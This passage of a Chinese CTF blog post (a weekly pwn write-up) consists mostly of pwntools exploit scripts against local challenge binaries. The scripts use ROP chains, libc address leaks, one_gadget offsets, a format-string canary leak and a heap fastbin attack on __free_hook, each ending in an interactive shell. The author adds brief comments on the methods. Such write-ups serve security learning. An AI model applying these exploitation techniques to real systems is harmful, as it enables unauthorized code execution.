class="line">leave_ret = 0x080484e8</span><br><span class="line">p2 = p32(rop_addr)+p32(leave_ret)</span><br><span class="line">write(ret-4,p2)</span><br><span class="line">ru(&quot;\n&quot;)</span><br><span class="line">puts = u32(r(4))</span><br><span class="line">print &quot;puts: &quot;+hex(puts)</span><br><span class="line">libc.address = puts - libc.symbols[&quot;puts&quot;]</span><br><span class="line">sys = libc.symbols[&quot;system&quot;]</span><br><span class="line">one = libc.address + 0x3ac69</span><br><span class="line">rop2_addr = stack - 0x1cc</span><br><span class="line">new_ret = stack-0x1d0</span><br><span class="line">bin_sh = libc.search(&quot;/bin/sh&quot;).next()</span><br><span class="line">print hex(bin_sh)</span><br><span class="line">p3 = flat([sys,bin_sh,bin_sh])</span><br><span class="line">ru(&quot;name?\n&quot;)</span><br><span class="line">sd(p3)</span><br><span class="line">p4 = flat([rop2_addr,leave_ret])</span><br><span class="line">pause()</span><br><span class="line">write(new_ret,p3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>我好像有点太依赖 one_gadget 了,还得在整整 rop ~~~ 而且官方的 wp 也想用 one ,不过失败了, 23333~~~</p>
+<p>官方的 wp 就很秀了,这个用 puts 泄漏的 libc_base 比较优雅,很通用,而且最后起 shell ,也是用 so 的 sh 还是很容易理解的</p>
+<h2 id="pwn-11-7"><a href="#pwn-11-7" class="headerlink" title="pwn 11.7"></a>pwn 11.7</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;, checksec=False)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">pay = &#x27;a&#x27;*136+p64(0x40061A)+p64(0)+p64(1)+p64(elf.got[&#x27;write&#x27;])+p64(8)+p64(elf.got[&#x27;write&#x27;])+p64(1)+p64(0x400600)+p64(0)*7+p64(0x0400566)</span><br><span class="line">p.recvuntil(&#x27;0123&#x27;)</span><br><span class="line">p.send(pay)</span><br><span class="line">write = u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))</span><br><span class="line">print hex(write)</span><br><span class="line">base=write-libc.sym[&quot;write&quot;]</span><br><span class="line">print hex(base)</span><br><span class="line">one = base+0x4526a</span><br><span class="line">pay = &#x27;a&#x27;*136+p64(one)+p64(0)*10</span><br><span class="line">p.send(pay)</span><br><span class="line">p.interactive()</span><br><span class="line">````</span><br><span class="line"></span><br><span class="line">一个 one_gadget 必定通杀</span><br><span class="line"></span><br><span class="line">## pwn 11.8</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>from pwn import *<br>p&#x3D; process(‘pwn1’)<br>elf &#x3D; ELF(“.&#x2F;pwn1”, checksec&#x3D;False)<br>libc &#x3D; elf.libc<br>#context.log_level &#x3D; “debug”<br>p.sendline(“%2$p.%35$p”)</p>
+<h1 id="leak-canary-and-libc-addr"><a href="#leak-canary-and-libc-addr" class="headerlink" title="leak canary and libc_addr"></a>leak canary and libc_addr</h1><p>p.recvuntil(“0x”)<br>addr_offset &#x3D; int(p.recvuntil(“.0x”)[:-3],16)<br>canary &#x3D; int(p.recvuntil(‘,’)[:-1],16)<br>libc_base &#x3D; addr_offset - 1783920<br>one &#x3D; libc_base+0x5fbc6<br>p.recvuntil(‘messages:’)<br>payload &#x3D; ‘\x00’*0x64+p32(canary)+p32(0)<em>3+p32(one)<br>#gdb.attach(p,’b</em>0x80485FA ‘)</p>
+<p>p.sendline(payload)<br>#pause()<br>p.interactive()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">有点问题,但还好解决了,就是简单的格式化字符串加栈溢出,用 ida 看偏移有点不准,得自己用 gdb 调试出结果</span><br><span class="line"></span><br><span class="line">## Supwn5</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>from pwn import *<br>p &#x3D; process(‘.&#x2F;supwn5’,aslr&#x3D;0)<br>elf &#x3D; ELF(“.&#x2F;supwn5”, checksec&#x3D;False)<br>libc &#x3D; ELF(‘&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6’, checksec&#x3D;False)<br>#context.log_level &#x3D; “debug”<br>def new(size):<br>	p.sendlineafter(‘please chooice :\n’,’1’)<br>	p.sendlineafter(‘please input the size : \n’,str(size))<br>def free(ind):<br>	p.sendlineafter(‘please chooice :\n’,’2’)<br>	p.sendlineafter(‘which node do you want to delete\n’,str(ind))<br>def edit(ind,content):<br>	p.sendlineafter(‘please chooice :\n’,’4’)<br>	p.sendlineafter(‘which one do you want modify :\n’,str(ind))<br>	p.sendafter(‘please input the content’,content)<br>def show(ind):<br>	p.sendlineafter(‘please chooice :\n’,’3’)<br>	p.sendlineafter(‘which node do you want to show\n’,str(ind))</p>
+<p>new(0x80)<br>new(1)<br>free(0)<br>new(0x80)<br>show(0)<br>p.recvuntil(‘the content is : \n’)<br>leak &#x3D; u64(p.recvuntil(‘\n’)[:-1].ljust(8,”\x00”))<br>print hex(leak)<br>base &#x3D; leak-3951480<br>free_hook&#x3D;base+libc.symbols[‘__free_hook’]<br>one &#x3D; base+0xf1147<br>new(0x40)</p>
+<p>free(2)<br>edit(1,p64(0)*3+p64(0x51)+p64(0x61))<br>new(0x40)<br>new(0x50)<br>free(3)<br>edit(2,p64(0)*9+p64(0x61)+p64(leak-0x40))<br>new(0x50)<br>new(0x50)<br>edit(4,p64(0)*6+p64(leak-0x80))</p>
+<p>new(1)</p>
+<p>edit(5,p64(0)+p64(one))<br>gdb.attach(p)<br>print ‘one ‘+hex(one)<br>print ‘free_hook ‘+hex(free_hook)<br>new(1)<br>p.interactive()</p>
+<pre><code>
+不太好用,尴尬了,我看看 free_hook
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/11/04/2019-11-04-5th_week/" data-id="cuidDSXU04-c1cO61lW-61Kco" data-title="fifth week" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/11/11/2019-11-11-strange_1/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Some strange questions
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/10/28/2019-10-28-4th_week/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">forth week</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AI/">AI</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ai/" rel="tag">ai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chat/" rel="tag">chat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/Fuzz/" style="font-size: 10px;">Fuzz</a> <a href="/tags/Misc/" style="font-size: 12.5px;">Misc</a> <a href="/tags/Web/" style="font-size: 12.5px;">Web</a> <a href="/tags/ai/" style="font-size: 10px;">ai</a> <a href="/tags/chat/" style="font-size: 15px;">chat</a> <a href="/tags/fuzz/" style="font-size: 10px;">fuzz</a> <a href="/tags/misc/" style="font-size: 17.5px;">misc</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/08/">August 1999</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/01/">January 1999</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/10/01/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/27/2023-06-27-fuzzer/">如何完成一个 fuzzer</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/31/2023-05-31-report/">安全开发</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/31/2023-06-18-fixandPR/">记一次 fuzz go 的一个第三方库</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/23/2023-05-23-waf/">AI 安全之</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
